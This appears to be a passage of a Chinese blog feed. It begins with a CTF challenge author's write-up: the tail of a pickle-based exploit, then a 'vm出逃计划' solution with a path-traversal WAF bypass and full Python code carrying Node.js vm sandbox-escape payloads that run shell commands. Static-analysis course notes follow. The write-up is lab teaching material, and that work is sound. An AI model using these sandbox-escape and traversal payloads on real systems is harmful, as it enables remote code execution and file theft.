class="string">f&quot;wget <span class="subst">&#123;baseURL&#125;</span>/static/img.png -q&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]the flag is:&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;cat ./img.png&quot;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parse = argparse.ArgumentParser()</span><br><span class="line">    parse.add_argument(<span class="string">&quot;-AP&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&quot;123456&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;you can reset the admin password by -AdminP option&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&quot;-U&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&quot;tester&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;the new register user&#x27;s username&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&quot;-P&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&quot;tester&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;the new register user&#x27;s password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    args = parse.parse_args()</span><br><span class="line">    </span><br><span class="line">    adminPassword = args.AP</span><br><span class="line">    registerUsername = args.U</span><br><span class="line">    registerPassword = args.P</span><br><span class="line"></span><br><span class="line">    AdminPasswordPollute(admin_password = adminPassword, new_username=registerUsername, new_password=registerPassword)</span><br><span class="line">    LoginAndPickleAttack(admin_password = adminPassword, new_username=registerUsername, new_password=registerPassword)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="我的出题踩坑点-1"><a href="#我的出题踩坑点-1" class="headerlink" title="我的出题踩坑点"></a>我的出题踩坑点</h3><ul><li>当部署在Windows上时直接访问api接口可以打通，但是部署到docker中的“Linux”环境下给我报了500，好怪~</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404111747109.png" alt="image-20240409223338542"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404111747317.png" alt="image-20240409223410734"></p><p>​后面检查了下是由于python pickle序列化时会生成的字节会受到操作系统不同的影响（因为当时exp是在windows下写的）</p><p>​所以后面在我的kali里装了个WSRX，然后exp打一遍，通了</p><h2 id="vm出逃计划"><a href="#vm出逃计划" class="headerlink" title="vm出逃计划"></a>vm出逃计划</h2><p>考点：绕过waf读取敏感文件，vm逃逸（CVE）</p><p>出题人：ch3</p><p>难度：简单</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>默认路由下会生成vmtoken，这是进入sandbox执行任意代码的一个check</p><p>在show路由下可以读，但是有个tricky的小waf，payload自己调试构造出来如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = &#x27;?path=.jpg./../vmtoken.txt&#x27;</span><br></pre></td></tr></table></figure><p>然后就是一个NodeJS的VM沙箱逃逸历史洞，对照历史版本去GitHub的issue里面找就行</p><h3 id="完整EXP-1"><a href="#完整EXP-1" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">baseURL = <span class="string">&quot;http://127.0.0.1:3000&quot;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate token</span></span><br><span class="line">resp = s.get(baseURL)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read token</span></span><br><span class="line">attackURL1 = <span class="string">&#x27;/show&#x27;</span></span><br><span class="line">payload1 = <span class="string">&#x27;?path=.jpg./../vmtoken.txt&#x27;</span></span><br><span class="line">resp = s.get(baseURL+attackURL1+payload1)</span><br><span class="line"><span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+]get vm token: <span class="subst">&#123;resp.text&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[-]can not get the vm token&#x27;</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">token = resp.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># RCE</span></span><br><span class="line">attackURL2 = <span class="string">&#x27;/sandbox&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个payload只能RCE一次,有点怪</span></span><br><span class="line">rcecode1 = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">err = &#123;&#125;;</span></span><br><span class="line"><span class="string">const handler = &#123;</span></span><br><span class="line"><span class="string">    getPrototypeOf(target) &#123;</span></span><br><span class="line"><span class="string">        (function stack() &#123;</span></span><br><span class="line"><span class="string">            new Error().stack;</span></span><br><span class="line"><span class="string">            stack();</span></span><br><span class="line"><span class="string">        &#125;)();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">const proxiedErr = new Proxy(err, handler);</span></span><br><span class="line"><span class="string">try &#123;</span></span><br><span class="line"><span class="string">    throw proxiedErr;</span></span><br><span class="line"><span class="string">&#125; catch (&#123;constructor: c&#125;) &#123;</span></span><br><span class="line"><span class="string">    c.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag &gt; ./img/flag.txt&#x27;);</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">rcecode2 = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">async function fn() &#123;</span></span><br><span class="line"><span class="string">    (function stack() &#123;</span></span><br><span class="line"><span class="string">        new Error().stack;</span></span><br><span class="line"><span class="string">        stack();</span></span><br><span class="line"><span class="string">    &#125;)();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">p = fn();</span></span><br><span class="line"><span class="string">p.constructor = &#123;</span></span><br><span class="line"><span class="string">    [Symbol.species]: class FakePromise &#123;</span></span><br><span class="line"><span class="string">        constructor(executor) &#123;</span></span><br><span class="line"><span class="string">            executor(</span></span><br><span class="line"><span class="string">                (x) =&gt; x,</span></span><br><span class="line"><span class="string">                (err) =&gt; &#123; return err.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag &gt; ./img/flag.txt&#x27;); &#125;</span></span><br><span class="line"><span class="string">            )</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">p.then();&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">f&#x27;?vmtoken=<span class="subst">&#123;token&#125;</span>&amp;code=<span class="subst">&#123;rcecode2&#125;</span>&#x27;</span></span><br><span class="line">resp2 = s.get(baseURL+attackURL2+payload2)</span><br><span class="line"><span class="keyword">if</span> resp2.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+]rce success&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[-]rce fail&#x27;</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get flag</span></span><br><span class="line">attackURL3 = <span class="string">&#x27;/show&#x27;</span></span><br><span class="line">payload3 = <span class="string">&#x27;?path=.jpg./../flag3.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">resp3 = s.get(baseURL+attackURL3+payload3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> resp3.status_code == <span class="number">200</span>:</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">f&#x27;[+]now get flag: <span class="subst">&#123;resp3.text&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment">#     print(f&#x27;[-]fail to get flag&#x27;)</span></span><br><span class="line"><span class="comment">#     s.close()</span></span><br><span class="line"><span class="comment">#     exit(1)</span></span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><h3 id="我的出题踩坑点-2"><a href="#我的出题踩坑点-2" class="headerlink" title="我的出题踩坑点"></a>我的出题踩坑点</h3><ul><li><p>CRLF的影响：解决方案&#x3D;&gt;使用python脚本实现网络交互，这样会比直接在浏览器GUI下操作更加细腻</p></li><li><p>两个payload进行RCE的效果不同，一个只能RCE一次（还没调试过）</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;很开心以web出题人的身份出现在这次比赛中，学到挺多的&lt;/p&gt;
&lt;p&gt;附件地址：&lt;a href=&quot;https://github.com/HongLaiCh3/CTF-Game&quot;&gt;https://github.com/HongLaiCh3/CTF-Game&lt;/a&gt;&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>NJU-Static-Analysis-Data-Flow-Analysis-1</title>
    <link href="http://example.com/2024/03/30/NJU-Static-Analysis-Data-Flow-Analysis-1/"/>
    <id>http://example.com/2024/03/30/NJU-Static-Analysis-Data-Flow-Analysis-1/</id>
    <published>2024-03-30T10:15:44.000Z</published>
    <updated>2024-05-03T05:24:57.052Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NJU-Static-Analysis-Data-Flow-Analysis-1"><a href="#NJU-Static-Analysis-Data-Flow-Analysis-1" class="headerlink" title="NJU-Static-Analysis-Data-Flow-Analysis-1"></a>NJU-Static-Analysis-Data-Flow-Analysis-1</h1><h2 id="Data-Flow-Analysis"><a href="#Data-Flow-Analysis" class="headerlink" title="Data Flow Analysis"></a>Data Flow Analysis</h2><ul><li><p>the core in Data Flow Analysis</p><ul><li>对数据的抽象</li><li>根据分析的类型，做出合适的估算</li><li>数据如何transfer</li><li>控制流如何处理</li><li>CFG</li></ul></li><li><p>May Analysis 和 Must Analysis</p></li></ul><blockquote><p>May analysis：输出信息可能正确 &#x3D;&gt; Sound</p><p>Must analysis：输出信息一定正确 &#x3D;&gt; complete</p></blockquote><ul><li>不同的数据流分析</li></ul><p>转移函数 与 控制流信息</p><blockquote><p>different data-flow analysis applications have</p><p>different data abstraction and</p><p>different flow safe-approximation strategies, i.e.,</p><p>different transfer functions and control-flow handlings</p></blockquote><h2 id="Preliminaries-of-Data-Flow-Analysis"><a href="#Preliminaries-of-Data-Flow-Analysis" class="headerlink" title="Preliminaries of Data Flow Analysis"></a>Preliminaries of Data Flow Analysis</h2><h3 id="Input-and-Output-States"><a href="#Input-and-Output-States" class="headerlink" title="Input and Output States"></a>Input and Output States</h3><ul><li><p>IR statement（$s_1$ ，$s_2$，$s_3$）</p></li><li><p>program point（input state 和 output state）&#x3D;&gt; 控制流edge上的程序状态</p><p>在具体的数据流分析中，我们把<code>PP</code>关联一个数据流值，代表该点中可观察到的抽象的程序状态</p></li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404301046489.png" alt="image-20240330195245325"></p><p><strong>一个说明Program Point的例子：</strong></p><p>​下图中的红色点就是Program Point</p><p>​Program Point与一个 data - flow value相挂钩</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404301046877.png" alt="image-20240330200520251"></p><p><strong>数据流分析</strong></p><blockquote><p>数据流分析：为所有语句的IN[s]和OUT[s]的一组安全近似导向约束找到一个解决方案</p><ul><li>基于语句语义的约束，传递函数</li><li>基于控制流的约束</li></ul></blockquote><h3 id="Transfer-Function’s-Constrains"><a href="#Transfer-Function’s-Constrains" class="headerlink" title="Transfer Function’s Constrains"></a>Transfer Function’s Constrains</h3><ul><li>控制流分析类型</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405011958311.png" alt="image-20240430195315785"></p><h3 id="控制流的约束"><a href="#控制流的约束" class="headerlink" title="控制流的约束"></a>控制流的约束</h3><ul><li>BB内控制流</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405011958981.png" alt="image-20240430221453025"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405011958968.png" alt="image-20240430221500576"></p><ul><li>BB间控制流</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405011958217.png" alt="image-20240430221609827"></p><h2 id="Reaching-Definitions-Analysis（到达定值分析）"><a href="#Reaching-Definitions-Analysis（到达定值分析）" class="headerlink" title="Reaching Definitions Analysis（到达定值分析）"></a>Reaching Definitions Analysis（到达定值分析）</h2><h3 id="Reaching-Definitions-基本概念"><a href="#Reaching-Definitions-基本概念" class="headerlink" title="Reaching Definitions 基本概念"></a>Reaching Definitions 基本概念</h3><blockquote><p>program point p 处对变量v的定义在q处可达，指p到q有一条路径，且在这条路径中不再存在对v的定义</p></blockquote><ul><li><p>x的定值d到达 （reaching） p：假定x有定值d（definition），如果存在一个路径p，并且在该路径上没有x的其他定值点</p></li><li><p>如果该路径上对 x 有其他定义，我们称x这个定值在该路径上 killed 了</p></li></ul><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404301156280.png" alt="rd" style="zoom:50%;" /><p>到达定值分析可以用来检测源代码中的未定义变量，检测思路：CFG入口处为源代码中的所有变量引入dummy definition，如果最终某个变量v的dummy definition能够达到该变量使用的program point，则变量v为未定义变量</p><h3 id="bit-vector"><a href="#bit-vector" class="headerlink" title="bit vector"></a>bit vector</h3><blockquote><p>使用bit vector的数据结构来表示：对于某个Program Point（记为p），$D_i$在该处置为1 &lt;&#x3D;&gt; $D_i$​处的变量定义经过某个BB后能够到达p</p></blockquote><p>​比如下图中的蓝色箭头中的<code>1100 0000</code>，表示$D_1$这条definition中的变量x在经过B2后能够到达</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405011956796.png" alt="image-20240501195618460"></p><h3 id="Transfer-Function和Control-Flow-约束"><a href="#Transfer-Function和Control-Flow-约束" class="headerlink" title="Transfer Function和Control Flow 约束"></a>Transfer Function和Control Flow 约束</h3><ul><li>Transfer Function（转移函数）约束</li></ul><p>​Gen指当前BB中存有的definition，而Kill指当前块中存有的definition对应的变量对应的其他definition</p><blockquote><p>例子：B1块中有$d_1$、$d_2$、$d_3$三条definition（记为<code>gen</code>），其对应变量为<code>i</code>、<code>j</code>、<code>a</code>，这三个变量有关的、且在其他BB的definition有$d_4$、$d_5$、$d_6$、$d_7$（记为<code>kill</code>）</p></blockquote><p>​一个BB的gen和kill都可以直接通过扫描所有BB来确定</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404302223446.png" alt="image-20240430220521445"></p><ul><li>control flow handling（控制流处理）约束</li></ul><p>​处理下一个<code>BB</code>的<code>In[B]</code>，因为输入可能来自很多其他<code>BB</code>的<code>OUT</code>，所以使用<code>Union</code></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404302222639.png" alt="image-20240430220220603"></p><h3 id="到达定值分析的算法"><a href="#到达定值分析的算法" class="headerlink" title="到达定值分析的算法"></a>到达定值分析的算法</h3><p>​Boundary Condition和其他Basic Block需要分隔开（可以理解为这是一个Iteration算法模板）</p><p>​</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404302223053.png" alt="image-20240430222310088"></p><p>​</p><p>​例子：参考课程PPT，跟一遍就能体悟到</p><h4 id="算法停止的时机"><a href="#算法停止的时机" class="headerlink" title="算法停止的时机"></a>算法停止的时机</h4><p>​这是整个算法的灵魂，重点在于<code>transfer function</code>的设计</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405011958821.png" alt="image-20240501190302838"></p><p>​对于一个已经构建好的控制流图，其gen[B]和kill[B]是固定的，所以能在多层迭代中存留的1必定会一直存留，所以正如课中所言，bit vector中每一位的最终结果必然是<code>0-&gt;1</code>或<code>1-&gt;1</code>，同时definition的个数为有限。</p><p>​所以必然存在一个bit vector的状态上界，等到某轮迭代结束后到达这个上界，使得算法停止</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NJU-Static-Analysis-Data-Flow-Analysis-1&quot;&gt;&lt;a href=&quot;#NJU-Static-Analysis-Data-Flow-Analysis-1&quot; class=&quot;headerlink&quot; title=&quot;NJU-Static-A</summary>
      
    
    
    
    
    <category term="Static Analysis" scheme="http://example.com/tags/Static-Analysis/"/>
    
  </entry>
  
  <entry>
    <title>NJU Static Analysis - Intermediate Representation</title>
    <link href="http://example.com/2024/03/24/NJU-Static-Analysis-Intermediate-Representation/"/>
    <id>http://example.com/2024/03/24/NJU-Static-Analysis-Intermediate-Representation/</id>
    <published>2024-03-24T09:21:27.000Z</published>
    <updated>2024-03-24T09:22:19.602Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NJU-Static-Analysis-Intermediate-Representation"><a href="#NJU-Static-Analysis-Intermediate-Representation" class="headerlink" title="NJU Static Analysis - Intermediate Representation"></a>NJU Static Analysis - Intermediate Representation</h1><p>重点：</p><ul><li><p>编译过程中的IR</p></li><li><p>3AC –&gt; BB –&gt; CFG的构建过程</p></li></ul><h2 id="Complier"><a href="#Complier" class="headerlink" title="Complier"></a>Complier</h2><p>大致过程如下：</p><blockquote><p>词法分析（Scanner）&#x3D;&gt; 生成token</p><p>语法分析（Parser）&#x3D;&gt; 由token解析成AST（非上下文检查，比如只把token组成一个语句而已）</p><p>语义分析（Type Checker） &#x3D;&gt; 上下文基础上进行检查</p><p>然后通过Translator（这个依语言而定）来转成IR（中间表示）</p></blockquote><p><strong>静态分析的对象就是IR</strong></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403241720545.png" alt="image-20240323213739799"></p><h2 id="IR"><a href="#IR" class="headerlink" title="IR"></a>IR</h2><p>IR的表示方法：</p><table><thead><tr><th align="left">组织结构 特点</th><th align="left">类型</th><th>举例</th></tr></thead><tbody><tr><td align="left">Linear IR</td><td align="left">基于线性代码、堆栈机代码</td><td>三地址代码</td></tr><tr><td align="left">Graphical IR</td><td align="left">基于图 抽象语</td><td>抽象语法树、法树、有向无环图、控制流图</td></tr><tr><td align="left">Hybrid IR</td><td align="left">基于图与线性代码混合 LLVM IR</td><td></td></tr></tbody></table><h3 id="3AC"><a href="#3AC" class="headerlink" title="3AC"></a>3AC</h3><p>3地址码</p><ul><li>Some Common 3AC Forms</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403241720410.png" alt="image-20240323215258383"></p><blockquote><p>不同静态分析框架中的3AC表示形式不同</p></blockquote><h3 id="SSA"><a href="#SSA" class="headerlink" title="SSA"></a>SSA</h3><p>SSA（Static Single Assignment）</p><blockquote><p>给每个符号都添加下标以区别不同时刻下的符号信息</p></blockquote><blockquote><ul><li>Give each definition a fresh name</li><li>Propagate fresh name to subsequent uses</li><li>Every variable has exactly one definition</li></ul></blockquote><p>需要在控制流图上添加一些新的语句</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403241706766.png" alt="image-20240324155713331"></p><h2 id="Control-Flow-Analysis"><a href="#Control-Flow-Analysis" class="headerlink" title="Control Flow Analysis"></a>Control Flow Analysis</h2><blockquote><p>3AC &#x3D;&gt; BB &#x3D;&gt; CFG</p></blockquote><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403241706180.png" alt="image-20240324160508540"></p><h3 id="Basic-Blocks（BB）"><a href="#Basic-Blocks（BB）" class="headerlink" title="Basic Blocks（BB）"></a>Basic Blocks（BB）</h3><blockquote><p>Basic blocks (BB) are maximal sequences of consecutive three-address instructions</p><p>（连续的三地址码序列）</p></blockquote><blockquote><p>BB中的入口只能是BB中的第一句</p><p>结束语句只能是BB中的最后一句</p></blockquote><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403241706047.png" alt="image-20240324161340952"></p><h4 id="build-Basic-Blocks"><a href="#build-Basic-Blocks" class="headerlink" title="build Basic Blocks"></a>build Basic Blocks</h4><p>每个Basic Blocks中的第一条指令是leader</p><p>我们确定每个Basic Block的本质方法是确定Basic Block中的leader和跳转语句即可</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403241706583.png" alt="image-20240324165538362"></p><h3 id="Control-Flow-Graph（CFG）"><a href="#Control-Flow-Graph（CFG）" class="headerlink" title="Control Flow Graph（CFG）"></a>Control Flow Graph（CFG）</h3><p>控制流图的构建过程，注重“静态”思维，对于一些永真的判断是不关注的</p><ul><li>CFG的节点是BB</li><li>一个Basic Block到另一个Basic Block之间有且仅有一个edge<ul><li>有条件跳转，相邻块之间需要加edge</li><li>无条件跳转，相邻块之间不需要加edge</li></ul></li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403241706557.png" alt="image-20240324170233088"></p><ul><li>goto label-value &#x3D;&#x3D;&gt; goto BasicBlock Name</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403241706471.png" alt="image-20240324170558671"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NJU-Static-Analysis-Intermediate-Representation&quot;&gt;&lt;a href=&quot;#NJU-Static-Analysis-Intermediate-Representation&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    
    <category term="Static Analysis" scheme="http://example.com/tags/Static-Analysis/"/>
    
  </entry>
  
  <entry>
    <title>NJU Static Analysis - Introduction</title>
    <link href="http://example.com/2024/03/20/NJU-Static-Analysis-Introduction/"/>
    <id>http://example.com/2024/03/20/NJU-Static-Analysis-Introduction/</id>
    <published>2024-03-20T13:44:13.000Z</published>
    <updated>2024-04-30T03:21:13.720Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NJU-Static-Analysis-Introduction"><a href="#NJU-Static-Analysis-Introduction" class="headerlink" title="NJU Static Analysis - Introduction"></a>NJU Static Analysis - Introduction</h1><blockquote><p>程序分析这块还处于宝宝阶段，故做下课堂笔记</p><p>感谢李老师和谭老师的开源精神~~  :)</p><p>（笔记中的截图来自于两位老师的PPT）</p></blockquote><h2 id="Why？"><a href="#Why？" class="headerlink" title="Why？"></a>Why？</h2><ul><li><p>程序可靠性</p><p>空指针、内存泄露</p></li><li><p>程序安全性</p></li></ul><p>​检测注入攻击路径</p><ul><li><p>编译优化</p><p>死代码优化、代码移动优化</p></li><li><p>程序理解</p><p>程序调用关系、类型检测</p></li></ul><h2 id="What"><a href="#What" class="headerlink" title="What?"></a>What?</h2><h3 id="Static-Analysis"><a href="#Static-Analysis" class="headerlink" title="Static Analysis"></a>Static Analysis</h3><blockquote><p>给定程序P，在不运行P的情况下，使用静态分析程序对其分析，判断P是否满足特性Q</p></blockquote><h3 id="Rice-Theorem"><a href="#Rice-Theorem" class="headerlink" title="Rice Theorem"></a>Rice Theorem</h3><blockquote><p>&#x3D;&gt; No Perfect static analysis</p></blockquote><h3 id="Perfect-Static-Analysis"><a href="#Perfect-Static-Analysis" class="headerlink" title="Perfect Static Analysis"></a>Perfect Static Analysis</h3><blockquote><p>Sound and Complete &#x3D;&gt; Perfect Static Analysis</p></blockquote><h4 id="What-is-Sound-and-Complete"><a href="#What-is-Sound-and-Complete" class="headerlink" title="What is Sound and Complete"></a>What is Sound and Complete</h4><ul><li><code>Sound</code>：对于程序存在的可能行为不漏报但有错报</li><li><code>Truth</code>：既不错报也不漏报</li><li><code>Complete</code>：漏报</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403202054529.png" alt="image-20240320191240299"></p><ul><li><code>false negatives</code></li><li><code>false positive</code></li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403202143129.png" alt="image-20240320205907751"></p><h3 id="Userful-Static-Analysis"><a href="#Userful-Static-Analysis" class="headerlink" title="Userful Static Analysis"></a>Userful Static Analysis</h3><p>• Compromise soundness (false negatives)</p><p>• Compromise completeness (false positives) </p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403202143268.png" alt="image-20240320205957189"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403202143143.png" alt="image-20240320205948604"></p><blockquote><p>Nowdays, Static Analysis’ trends:</p><p>​<strong>Sound</strong> <strong>but</strong> <strong>not fully-precise</strong> static analysis</p></blockquote><h4 id="Necessity-of-Soundness"><a href="#Necessity-of-Soundness" class="headerlink" title="Necessity of Soundness"></a>Necessity of Soundness</h4><blockquote><p>Soundness mean more bugs could be found</p></blockquote><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403202143945.png" alt="image-20240320210737920"></p><h4 id="Example-of-Soundness"><a href="#Example-of-Soundness" class="headerlink" title="Example of Soundness"></a>Example of Soundness</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(input)</span><br><span class="line">    x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    x = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><blockquote><p>Static Analysis Results:</p><ol><li><p>When input is true, x &#x3D; 1</p><p>When input is false, x &#x3D; 0</p><p>&#x3D;&gt; sound</p></li><li><p>x &#x3D; 1 or x &#x3D; 0</p><p>&#x3D;&gt; sound</p></li><li><p>x &#x3D; 0, 1, 2, 3, 4</p><p>&#x3D;&gt; sound</p></li><li><p>x &#x3D; -1, 0</p><p>&#x3D;&gt; unsound</p></li></ol></blockquote><h3 id="Abstraction"><a href="#Abstraction" class="headerlink" title="Abstraction"></a>Abstraction</h3><p>对于变量进行符号抽象</p><p>一个形象的例子：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403202143686.png" alt="image-20240320211524156"></p><ul><li>定义符号之后，那么可以对运算进行相应的定义了</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403202143419.png" alt="image-20240320211649359"></p><p><code>sound</code>：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403202143179.png" alt="image-20240320211950981"></p><h3 id="Over-approximation"><a href="#Over-approximation" class="headerlink" title="Over-approximation"></a>Over-approximation</h3><blockquote><p>Control flow (from wiki) :</p><p>control flow is the <strong>order</strong> in which individual <a href="https://en.wikipedia.org/wiki/Statement_(computer_science)">statements</a>, <a href="https://en.wikipedia.org/wiki/Instruction_(computer_science)">instructions</a> or <a href="https://en.wikipedia.org/wiki/Function_call">function calls</a> of an <a href="https://en.wikipedia.org/wiki/Imperative_programming">imperative</a> <a href="https://en.wikipedia.org/wiki/Computer_program">program</a> are <a 